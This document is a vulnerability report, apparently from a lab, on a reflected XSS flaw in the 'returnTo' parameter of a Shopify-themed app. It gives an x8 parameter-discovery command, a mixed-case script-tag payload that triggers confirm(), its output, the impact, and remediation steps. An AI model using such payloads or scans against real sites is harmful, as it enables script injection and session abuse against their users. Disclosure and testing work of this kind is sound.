## Title

Reflected XSS - Shopify

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability was identified on the Shopify-themed application hosted at `go.pwnedbox.site`.

During testing, the application was found to accept user-controlled input through the `returnTo` GET parameter. The parameter reflects the supplied input without proper output encoding, allowing a specially crafted mixed-case script-tag payload to execute JavaScript in the browser.

The vulnerability was confirmed using JavaScript's `confirm()` function, which displayed a browser confirmation dialog containing `XSS`.

**Affected URL:** https://go.pwnedbox.site/

**HTTP Method:** GET

**Affected Parameter:** `returnTo`

## Steps to Reproduce

1. Run the following command to discover reflected GET parameters:

   ```bash
   x8 -u https://go.pwnedbox.site/ -X GET --disable-progress-bar --reflected-only -w params.txt
   ```

2. Observe that `x8` identifies `returnTo` as a reflected parameter.
3. Open the following URL in a browser:

   ```text
   https://go.pwnedbox.site/?returnTo="mihir%27"><ScRiPT>confirm("XSS");</ScRiPT>
   ```

4. Observe that the application processes the supplied input through the `returnTo` parameter.
5. A browser confirmation dialog displaying `XSS` appears.
6. Dismiss the dialog and observe the resulting page.

## POC (Proof of Concept)

**Lab Address:** https://go.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `returnTo`

**Parameter Discovery Command:**

```bash
x8 -u https://go.pwnedbox.site/ -X GET --disable-progress-bar --reflected-only -w params.txt
```

**Discovery Result:**

```text
urls:            https://go.pwnedbox.site/
methods:         GET
reflects:        returnTo
```

**Payload:**

```html
"mihir%27"><ScRiPT>confirm("XSS");</ScRiPT>
```

**Observed Result:**

The supplied payload was processed through the `returnTo` parameter, and JavaScript execution was successfully demonstrated through a browser confirmation dialog displaying `XSS`.

**Screenshot Evidence:**

1. Terminal screenshot showing `x8` parameter discovery and the reflected `returnTo` parameter.
<img width="1517" height="306" alt="image" src="https://github.com/user-attachments/assets/ea7f78e5-198d-40b8-aa08-528272c8fed2" />

2. Browser screenshot showing the crafted URL and the Shopify-themed account details page.
<img width="1919" height="973" alt="image" src="https://github.com/user-attachments/assets/5f968d56-c197-4383-b543-05c80eecf6e5" />

3. Browser confirmation dialog displaying `XSS`.
<img width="1905" height="970" alt="image" src="https://github.com/user-attachments/assets/1ac3f683-1328-4c66-89c2-f9d2ce97d924" />

4. Browser screenshot showing the page after dismissing the confirmation dialog.
<img width="1918" height="972" alt="image" src="https://github.com/user-attachments/assets/2b8740aa-6664-433c-b8a8-5ea6ee5c1967" />

## Impact

An attacker could potentially craft a malicious URL containing an XSS payload and trick a victim into opening it.

Successful exploitation could result in:

- Execution of arbitrary JavaScript in the victim's browser.
- Phishing attacks through manipulated page content.
- Unauthorized modification of displayed application content.
- Potential abuse of the victim's authenticated session, depending on application security protections.

## Remediation

1. Implement context-aware output encoding for all user-controlled input before rendering it in HTML.
2. Validate and safely handle redirect-related parameters such as `returnTo`.
3. Avoid unsafe HTML insertion methods when processing untrusted input.
4. Implement a restrictive Content Security Policy (CSP) to reduce the risk of unauthorized JavaScript execution.
